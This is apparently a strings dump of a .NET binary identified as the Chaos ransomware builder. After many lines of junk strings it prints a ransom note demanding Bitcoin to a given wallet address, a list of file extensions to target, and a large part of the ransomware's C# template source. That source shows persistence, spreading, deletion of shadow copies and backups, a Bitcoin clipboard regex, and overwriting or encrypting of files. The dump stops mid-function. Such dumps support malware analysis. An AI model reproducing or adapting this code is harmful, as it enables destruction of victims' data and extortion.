Metadata Signature: 0xaaa14 0x10001424a5342 12
.NET Version: v2.0.50727
Number of Metadata Streams: 5
DirectoryAddress: 6c Size: 164
Stream name: #~ 4
DirectoryAddress: 1d0 Size: 1e0
Stream name: #Strings 12
DirectoryAddress: 3b0 Size: 78
Stream name: #US 4
DirectoryAddress: 428 Size: 10
Stream name: #GUID 8
DirectoryAddress: 438 Size: 80
Stream name: #Blob 8
[Strings]
nth  paddr      vaddr      len  size section type    string
1818 0x0002c2c0 0x0042d2c0 5    6    .text   ascii   Iidjb
1819 0x0002c2dc 0x0042d2dc 5    6    .text   ascii   Z,oZ_
1820 0x0002c2fc 0x0042d2fc 11   14   .text   utf8    3\v,ݙ&?=߲>_, blocks=Basic Latin,Arabic Supplement,NKo
1821 0x0002c31b 0x0042d31b 4    5    .text   ascii   QH9k
1822 0x0002c345 0x0042d345 4    5    .text   ascii   Z#79
1823 0x0002c350 0x0042d350 4    6    .text   utf8    $ưi~ blocks=Basic Latin,Latin Extended-B
1824 0x0002c38d 0x0042d38d 4    5    .text   ascii   \f>~r
1825 0x0002c393 0x0042d393 4    5    .text   ascii   V\vEn
1826 0x0002c3e6 0x0042d3e6 4    5    .text   ascii   q".K
1827 0x0002c3fa 0x0042d3fa 4    5    .text   ascii   ~Laf
1828 0x0002c439 0x0042d439 7    8    .text   ascii   }bT&-\a-
1829 0x0002c4ca 0x0042d4ca 4    6    .text   utf8    &֑$3 blocks=Basic Latin,Hebrew
1830 0x0002c50d 0x0042d50d 4    6    .text   utf8    s]|ߗ blocks=Basic Latin,NKo
1831 0x0002c549 0x0042d549 8    9    .text   ascii   \bsWooyh'
1832 0x0002c5c2 0x0042d5c2 4    5    .text   ascii   F]zO
1833 0x0002c5e5 0x0042d5e5 4    5    .text   ascii   X:I<
1834 0x0002c63d 0x0042d63d 5    7    .text   utf8    R(6-̙ blocks=Basic Latin,Combining Diacritical Marks
1835 0x0002c647 0x0042d647 4    5    .text   ascii   S/0{
1836 0x0002c665 0x0042d665 4    5    .text   ascii   (Np?
1837 0x0002c702 0x0042d702 4    6    .text   utf8    K'Ɍ\f blocks=Basic Latin,Latin Extended-B
1838 0x0002c708 0x0042d708 8    10   .text   utf8    UkԊ%JKyq blocks=Basic Latin,Cyrillic Supplement
1839 0x0002c716 0x0042d716 6    9    .text   utf8    A\a隮#C" blocks=Basic Latin,CJK Unified Ideographs
1840 0x0002c721 0x0042d721 7    9    .text   utf8    PZX&?5ˏ blocks=Basic Latin,Spacing Modifier Letters
1841 0x0002c787 0x0042d787 5    6    .text   ascii   \f='FI
1842 0x0002c791 0x0042d791 5    8    .text   utf8    'פ<uĥ blocks=Basic Latin,Hebrew,Latin Extended-A
1843 0x0002c7d2 0x0042d7d2 5    7    .text   utf8    Yܲqe5 blocks=Basic Latin,Syriac
1844 0x0002c7eb 0x0042d7eb 8    9    .text   ascii   3\f>{CO>B
1845 0x0002c7f7 0x0042d7f7 4    5    .text   ascii   \a{)/
1846 0x0002c845 0x0042d845 5    6    .text   ascii   '%E\eD
1847 0x0002c85e 0x0042d85e 7    8    .text   ascii   `\fsWo1u
1848 0x0002c884 0x0042d884 4    5    .text   ascii   L_PW
1849 0x0002c8bc 0x0042d8bc 4    5    .text   ascii   v@+2
1850 0x0002c904 0x0042d904 4    5    .text   ascii   <GHj
1851 0x0002c989 0x0042d989 4    5    .text   ascii   UQGZ
1852 0x0002c9e1 0x0042d9e1 4    5    .text   ascii   _X\tT
1853 0x0002ca56 0x0042da56 7    9    .text   utf8    7_#֑"{x blocks=Basic Latin,Hebrew
1854 0x0002caa8 0x0042daa8 6    8    .text   utf8    ,ݺK9W` blocks=Basic Latin,Arabic Supplement
1855 0x0002cabe 0x0042dabe 6    8    .text   utf8    ɘF#R}] blocks=IPA Extensions,Basic Latin
1856 0x0002cac8 0x0042dac8 5    6    .text   ascii   E2#}$
1857 0x0002cae6 0x0042dae6 4    6    .text   utf8    }lDʆ blocks=Basic Latin,IPA Extensions
1858 0x0002cb50 0x0042db50 5    7    .text   utf8    Z,SZȵ blocks=Basic Latin,Latin Extended-B
1859 0x0002cb68 0x0042db68 4    5    .text   ascii   ?Oaf
1860 0x0002cb84 0x0042db84 4    5    .text   ascii   Ei1G
1861 0x0002cba1 0x0042dba1 4    5    .text   ascii   N,J4
1862 0x0002cbee 0x0042dbee 9    11   .text   utf8    .H\n7_$75ߚ blocks=Basic Latin,NKo
1863 0x0002cc2c 0x0042dc2c 5    6    .text   ascii   \b4\n9O
1864 0x0002ccb7 0x0042dcb7 5    6    .text   ascii   jas+_
1865 0x0002cd41 0x0042dd41 4    5    .text   ascii   ?C\vp
1866 0x0002cd6c 0x0042dd6c 8    9    .text   ascii   I \nfXiG\a
1867 0x0002cdae 0x0042ddae 6    7    .text   ascii    yFE08
1868 0x0002cded 0x0042dded 4    6    .text   utf8    %`Qڏ blocks=Basic Latin,Arabic
1869 0x0002ce14 0x0042de14 5    6    .text   ascii   Z,{B8
1870 0x0002cf09 0x0042df09 4    5    .text   ascii   wL \e
1871 0x0002cf6d 0x0042df6d 7    8    .text   ascii   .#\r@ma'
1872 0x0002cf9a 0x0042df9a 9    11   .text   utf8    ҟlg\bZ,mC& blocks=Cyrillic,Basic Latin
1873 0x0002d06a 0x0042e06a 4    6    .text   utf8    Ų3B\a blocks=Latin Extended-A,Basic Latin
1874 0x0002d0a6 0x0042e0a6 4    6    .text   utf8    ڷXZc blocks=Arabic,Basic Latin
1875 0x0002d0d6 0x0042e0d6 5    6    .text   ascii   4RlWl
1876 0x0002d1cc 0x0042e1cc 4    5    .text   ascii   ^-\bo
1877 0x0002d2bc 0x0042e2bc 5    7    .text   utf8    H#JAǀ blocks=Basic Latin,Latin Extended-B
1878 0x0002d2fa 0x0042e2fa 6    7    .text   ascii   Q\netP\e
1879 0x0002d34d 0x0042e34d 4    5    .text   ascii   \r\DT
1880 0x0002d363 0x0042e363 4    5    .text   ascii   4JiL
1881 0x0002d369 0x0042e369 4    5    .text   ascii   Htp?
1882 0x0002d36f 0x0042e36f 4    6    .text   utf8    ŲsV\e blocks=Latin Extended-A,Basic Latin
1883 0x0002d385 0x0042e385 5    8    .text   utf8    L؟զV} blocks=Basic Latin,Arabic,Armenian
1884 0x0002d39a 0x0042e39a 5    6    .text   ascii   -\b_b=
1885 0x0002d3c0 0x0042e3c0 5    7    .text   utf8    \f"O8\n
1886 0x0002d3d5 0x0042e3d5 4    5    .text   ascii   \tj{|
1887 0x0002d3fe 0x0042e3fe 4    5    .text   ascii   6]h9
1888 0x0002d421 0x0042e421 5    7    .text   utf8    @ܣ\t$S blocks=Basic Latin,Syriac
1889 0x0002d466 0x0042e466 4    5    .text   ascii   \tD\r*
1890 0x0002d499 0x0042e499 4    5    .text   ascii   s\a-{
1891 0x0002d4c0 0x0042e4c0 5    6    .text   ascii   m,0U.
1892 0x0002d56c 0x0042e56c 6    7    .text   ascii   c6.`i\e
1893 0x0002d59a 0x0042e59a 5    6    .text   ascii   uPZi'
1894 0x0002d5a0 0x0042e5a0 4    5    .text   ascii   gv[`
1895 0x0002d5c0 0x0042e5c0 4    5    .text   ascii   `3jH
1896 0x0002d5dc 0x0042e5dc 4    5    .text   ascii   15?h
1897 0x0002d637 0x0042e637 4    6    .text   utf8    ҮVJ) blocks=Cyrillic,Basic Latin
1898 0x0002d67d 0x0042e67d 4    5    .text   ascii   Y6%|
1899 0x0002d697 0x0042e697 4    5    .text   ascii   A\\t?
1900 0x0002d6a2 0x0042e6a2 4    5    .text   ascii   Jk-^
1901 0x0002d725 0x0042e725 4    5    .text   ascii   /~x0
1902 0x0002d873 0x0042e873 4    6    .text   utf8    \td"ϛ blocks=Basic Latin,Greek and Coptic
1903 0x0002d882 0x0042e882 4    5    .text   ascii   YH"Y
1904 0x0002d8c1 0x0042e8c1 4    6    .text   utf8    7(}ϲ blocks=Basic Latin,Greek and Coptic
1905 0x0002d906 0x0042e906 4    5    .text   ascii   hv-#
1906 0x0002d92b 0x0042e92b 4    5    .text   ascii   oV\vw
1907 0x0002d95f 0x0042e95f 4    5    .text   ascii   \aL\rc
1908 0x0002d984 0x0042e984 8    9    .text   ascii   \ec\fJim;\v
1909 0x0002d992 0x0042e992 4    6    .text   utf8    ^_Xӏ blocks=Basic Latin,Cyrillic
1910 0x0002d9a5 0x0042e9a5 7    10   .text   utf8    \v짵9\`\b) blocks=Basic Latin,Hangul Syllables
1911 0x0002da3a 0x0042ea3a 4    5    .text   ascii   {?bc
1912 0x0002da7a 0x0042ea7a 4    6    .text   utf8    aRiǩ blocks=Basic Latin,Latin Extended-B
1913 0x0002dbbd 0x0042ebbd 4    5    .text   ascii   IEND
1914 0x0003d694 0x0043e694 16   68   .text   utf32le \e-.......y|{{{{{
1915 0x0003e68c 0x0043f68c 13   56   .text   utf32le [ZZZZ[[[[VVVU
1916 0x00042770 0x00443770 4    20   .text   utf32le \r\r\r\n
1917 0x000449d0 0x004459d0 11   48   .text   utf32le \e ++29ĹĽŀ@3 blocks=Basic Latin,Latin Extended-A
1918 0x000460d0 0x004470d0 963  964  .text   ascii   \a----> Chaos is multi language ransomware. Translate your note to any language <----\r\nAll of your files have been encrypted\r\nYour computer was infected with a ransomware virus. Your files have been encrypted and you won't \r\nbe able to decrypt them without our help.What can I do to get my files back?You can buy our special \r\ndecryption software, this software will allow you to recover all of your data and remove the\r\nransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.\r\nHow do I pay, where do I get Bitcoin?\r\nPurchasing Bitcoin varies from country to country, you are best advised to do a quick google search\r\nyourself  to find out how to buy Bitcoin. \r\nMany of our customers have reported these sites to be fast and reliable:\r\nCoinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com\r\n\r\nPayment informationAmount: 0.1473766 BTC\r\nBitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0\r\n
1919 0x000464a4 0x004474a4 145  146  .text   ascii   lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
1920 0x00046541 0x00447541 8    9    .text   ascii   PADPADP/
1921 0x00046555 0x00447555 13   28   .text   utf16le textBox1.Text
1922 0x00046575 0x00447575 1683 1684 .text   ascii   \r".txt",".jar",".dat",".contact",".settings",".doc",".docx",".xls",".xlsx",".ppt",".pptx",".odt",".jpg",".mka",".mhtml",".oqy",".png",".csv",".py",".sql",".mdb",".php",".asp",".aspx",".html",".htm",".xml",".psd",".pdf",".xla",".cub",".dae",".indd",".cs",".mp3",".mp4",".dwg",".zip",".rar",".mov",".rtf",".bmp",".mkv",".avi",".apk",".lnk",".dib",".dic",".dif",".divx",".iso",".7zip",".ace",".arj",".bz2",".cab",".gzip",".lzh",".tar",".jpeg",".xz",".mpeg",".torrent",".mpg",".core",".pdb",".ico",".pas",".db",".wmv",".swf",".cer",".bak",".backup",".accdb",".bay",".p7c",".exif",".vss",".raw",".m4a",".wma",".flv",".sie",".sum",".ibank",".wallet",".css",".js",".rb",".crt",".xlsm",".xlsb",".7z",".cpp",".java",".jpe",".ini",".blob",".wps",".docm",".wav",".3gp",".webm",".m4v",".amv",".m4p",".svg",".ods",".bk",".vdi",".vmdk",".onepkg",".accde",".jsp",".json",".gif",".log",".gz",".config",".vb",".m1v",".sln",".pst",".obj",".xlam",".djvu",".inc",".cvs",".dbf",".tbi",".wpd",".dot",".dotx",".xltx",".pptm",".potx",".potm",".pot",".xlw",".xps",".xsd",".xsf",".xsl",".kmz",".accdr",".stm",".accdt",".ppam",".pps",".ppsm",".1cd",".3ds",".3fr",".3g2",".accda",".accdc",".accdw",".adp",".ai",".ai3",".ai4",".ai5",".ai6",".ai7",".ai8",".arw",".ascx",".asm",".asmx",".avs",".bin",".cfm",".dbx",".dcm",".dcr",".pict",".rgbe",".dwt",".f4v",".exr",".kwm",".max",".mda",".mde",".mdf",".mdw",".mht",".mpv",".msg",".myi",".nef",".odc",".geo",".swift",".odm",".odp",".oft",".orf",".pfx",".p12",".pl",".pls",".safe",".tab",".vbs",".xlk",".xlm",".xlt",".xltm",".svgz",".slk",".tar.gz",".dmg",".ps",".psb",".tif",".rss",".key",".vob",".epsp",".dc3",".iff",".onepkg",".onetoc2",".opt",".p7b",".pam",".r3d"
1923 0x00046c1c 0x00447c1c 145  146  .text   ascii   lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
1924 0x00046cb9 0x00447cb9 8    9    .text   ascii   PADPADPA
1925 0x00046ccd 0x00447ccd 11   24   .text   utf16le label1.Text
1926 0x00046cea 0x00447cea 568  569  .text   ascii   Chaos is multi language ransomware which \r\nmeans you can translate your note to any\r\n language. This Ransoware encrypts all files \r\nand drops a note for every folder in which files have \r\nbeen encrypted. You can overwrite all files or encrypt \r\nthem with aes/rsa encryption method. Create \r\nyour decrypter using the advanced option. \r\nPublic and private keys will be created automatically. \r\nKeep private key and decrypter. Without them files \r\ncannot be returned.\r\nThis project depends on your donation. \r\nPlease donete if you want to see next\r\nreleases in the future
1927 0x00046f34 0x00447f34 145  146  .text   ascii   lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
1928 0x00046fd1 0x00447fd1 7    8    .text   ascii   PADPADP
1929 0x00046fed 0x00447fed 6    14   .text   utf16le Source
1930 0x00046ffe 0x00447ffe 9    19   .text   utf16le decrypter
1931 0x00047018 0x00448018 1966 1966 .text   ascii   using System;\r\nusing System.Linq;\r\nusing System.Windows.Forms;\r\nusing System.Runtime.InteropServices;\r\nusing System.Text.RegularExpressions;\r\n\r\nnamespace ConsoleApplication7\r\n{\r\n    class Program\r\n    {\r\n        private static string userName = Environment.UserName;\r\n        private static string userDir = "C:\\Users\\";\r\n        public static string appMutexRun = "7z459ajrk722yn8c5j4fg";\r\n        public static bool encryptionAesRsa = #encryptOption;\r\n        public static string encryptedFileExtension = "#encryptedFileExtension";\r\n        private static bool checkSpread = #checkSpread;\r\n        private static string spreadName = "#spreadName";\r\n        private static bool checkCopyRoaming = #copyRoaming;\r\n        private static string processName = "#exeName";\r\n        public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";\r\n        private static bool checkStartupFolder = #startupFolder;\r\n        private static bool checkSleep = #checkSleep;\r\n        private static int sleepTextbox = #sleepTextbox;\r\n        private static string base64Image = @"#base64Image";\r\n        public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";\r\n        private static string droppedMessageTextbox = "#droppedMessageTextbox";\r\n        //************ Admin field **********\r\n        private static bool checkAdminPrivilage = #adminPrivilage;\r\n        private static bool checkdeleteShadowCopies = #checkdeleteShadowCopies;\r\n        private static bool checkdisableRecoveryMode = #checkdisableRecoveryMode;\r\n        private static bool checkdeleteBackupCatalog = #checkdeleteBackupCatalog;\r\n        //*****************\r\n        \r\n        public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";\r\n        public static string appMutex2 = appMutexStartup2 + appMutexRun2;\r\n        public static string staticSplit = "bc";\r\n        public static string appMutex = staticSplit+appMutexStartup + appMutexRun;\r\n        public readonly static Regex appMutexRegex = n
1932 0x000477c6 0x004487c6 1906 1907 .text   ascii   ew Regex(@"(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");\r\n        private static string[] messages = { \r\n                                #messages\r\n                            };\r\n        private static string[] validExtensions = new[]\r\n                {\r\n                    #extensions\r\n                };\r\n        public static class NativeMethods\r\n        {\r\n            [DllImport("user32.dll", SetLastError = true)]\r\n            [return: MarshalAs(UnmanagedType.Bool)]\r\n            public static extern bool AddClipboardFormatListener(IntPtr hwnd);\r\n\r\n            [DllImport("user32.dll", SetLastError = true)]\r\n            public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);\r\n\r\n            public const int clp = 0x031D;\r\n            public static IntPtr intpreclp = new IntPtr(-3);\r\n        }\r\n        [DllImport("user32.dll", CharSet = CharSet.Auto)]\r\n        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);\r\n        static void Main(string[] args)\r\n        {\r\n            if (AlreadyRunning())\r\n            {\r\n                System.Environment.Exit(1);\r\n            }\r\n            if (checkSleep)\r\n            {\r\n                sleepOutOfTempFolder();\r\n                //System.Threading.Thread.Sleep(sleepTextbox * 1000);\r\n            }\r\n            if (checkAdminPrivilage)\r\n            {\r\n                copyResistForAdmin(processName);\r\n            }\r\n            else\r\n            {\r\n                if (checkCopyRoaming)\r\n                {\r\n                    copyRoaming(processName);\r\n                }\r\n            }\r\n            if (checkStartupFolder)\r\n            {\r\n                addLinkToStartup();\r\n            }\r\n\r\n\r\n            lookForDirectories();\r\n\r\n            if (checkAdminPrivilage)\r\n            {\r\n                if (checkdeleteShadowCopies)\r\n                {
1933 0x00047f39 0x00448f39 1909 1910 .text   ascii   \n                    deleteShadowCopies();\r\n                }\r\n                if (checkdisableRecoveryMode)\r\n                {\r\n                    disableRecoveryMode();\r\n                }\r\n                if (checkdeleteBackupCatalog)\r\n                {\r\n                    deleteBackupCatalog();\r\n                }\r\n            }\r\n            if (checkSpread == true)\r\n            {\r\n                spreadIt(spreadName);\r\n            }\r\n            addAndOpenNote();\r\n            SetWallpaper(base64Image);\r\n            new System.Threading.Thread(() => { Run(); }).Start();\r\n        }\r\n\r\n        public static void Run()\r\n        {\r\n            Application.Run(new driveNotification.NotificationForm());\r\n        }\r\n\r\n        private static void sleepOutOfTempFolder()\r\n        {\r\n\r\n            string currentPath = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);\r\n            string tempFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);\r\n            if (currentPath != tempFolder)\r\n            {\r\n                System.Threading.Thread.Sleep(sleepTextbox * 1000);\r\n            }\r\n        }\r\n        private static bool AlreadyRunning()\r\n        {\r\n            System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcesses();\r\n            System.Diagnostics.Process currentProc = System.Diagnostics.Process.GetCurrentProcess();\r\n\r\n            foreach (System.Diagnostics.Process process in processes)\r\n            {\r\n                try\r\n                {\r\n                    if (process.Modules[0].FileName == System.Reflection.Assembly.GetExecutingAssembly().Location\r\n                                && currentProc.Id != process.Id)\r\n                        return true;\r\n                }\r\n                catch (Exception)\r\n                {\r\n\r\n                }\r\n            }\r\n\r\n            return false;
1934 0x000486af 0x004496af 1937 1937 .text   ascii   \n        }\r\n\r\n        public static byte[] random_bytes(int length)\r\n        {\r\n            Random rnd = new Random();\r\n            length = length + 1;\r\n            byte[] random = new byte[length];\r\n            rnd.NextBytes(random);\r\n            return random;\r\n        }\r\n        private static Random random = new Random();\r\n        public static string RandomString(int length)\r\n        {\r\n            const string pool = "abcdefghijklmnopqrstuvwxyz0123456789";\r\n            var builder = new System.Text.StringBuilder();\r\n\r\n            for (var i = 0; i < length; i++)\r\n            {\r\n                var c = pool[random.Next(0, pool.Length)];\r\n                builder.Append(c);\r\n            }\r\n\r\n            return builder.ToString();\r\n        }\r\n        public static string RandomStringForExtension(int length)\r\n        {\r\n            if (encryptedFileExtension == "")\r\n            {\r\n                const string pool = "abcdefghijklmnopqrstuvwxyz0123456789";\r\n                var builder = new System.Text.StringBuilder();\r\n\r\n                for (var i = 0; i < length; i++)\r\n                {\r\n                    var c = pool[random.Next(0, pool.Length)];\r\n                    builder.Append(c);\r\n                }\r\n\r\n                return builder.ToString();\r\n            }\r\n            else\r\n            {\r\n                return encryptedFileExtension;\r\n            }\r\n\r\n        }\r\n        public static string Base64EncodeString(string plainText)\r\n        {\r\n            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);\r\n            return System.Convert.ToBase64String(plainTextBytes);\r\n        }\r\n        public static string randomEncode(string plainText)\r\n        {\r\n            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);\r\n            return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + System.Convert.ToBase64String(pla
1935 0x00048e40 0x00449e40 1970 1970 .text   ascii   inTextBytes);\r\n        }\r\n        private static void encryptDirectory(string location)\r\n        {\r\n\r\n            try\r\n            {\r\n                string[] files = System.IO.Directory.GetFiles(location);\r\n                bool checkCrypted = true;\r\n                for (int i = 0; i < files.Length; i++)\r\n                {\r\n                    try\r\n                    {\r\n                        string extension = System.IO.Path.GetExtension(files[i]);\r\n                        string fileName = System.IO.Path.GetFileName(files[i]);\r\n                        \r\n                        if (Array.Exists(validExtensions, E => E == extension.ToLower()) && fileName != droppedMessageTextbox)\r\n                        {\r\n                            System.IO.FileInfo fi = new System.IO.FileInfo(files[i]);\r\n                            fi.Attributes = System.IO.FileAttributes.Normal;\r\n                            if (fi.Length < 2117152)\r\n                            {\r\n                                if (encryptionAesRsa == true)\r\n                                {\r\n                                    EncryptFile(files[i]);\r\n                                }\r\n                            }\r\n                            else if(fi.Length > 200000000){\r\n                                Random rnd = new Random();\r\n                                int rndSize = rnd.Next(200000000,300000000);\r\n                                string a = System.Text.Encoding.UTF8.GetString(random_bytes(rndSize));\r\n                                System.IO.File.WriteAllText(files[i], randomEncode(a));\r\n                                System.IO.File.Move(files[i], files[i] + "." + RandomStringForExtension(4));\r\n                            }\r\n                            else\r\n                            {\r\n                                string a = System.Text.Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fi.Length) / 4));\r\n                                System.IO.File.Write
